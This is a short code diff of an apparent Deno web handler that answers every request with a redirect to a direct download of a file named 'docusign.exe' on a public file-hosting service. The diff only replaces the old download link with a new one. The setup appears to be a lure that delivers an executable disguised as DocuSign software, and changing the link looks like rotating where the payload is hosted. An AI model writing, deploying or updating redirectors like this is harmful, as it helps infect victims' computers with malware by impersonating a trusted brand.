@@ -5,7 +5,7 @@ serve((_req) => {
   return new Response(null, {
     status: 302,
     headers: {
-      Location: "https://store-na-phx-4.gofile.io/download/direct/7aefb050-f774-457e-9feb-977d52e400a6/docusign.exe",
+      Location: "https://store9.gofile.io/download/direct/ec53069b-1c0f-437e-9e2d-9e3e4e528e23/docusign.exe",
     },
   });
 });
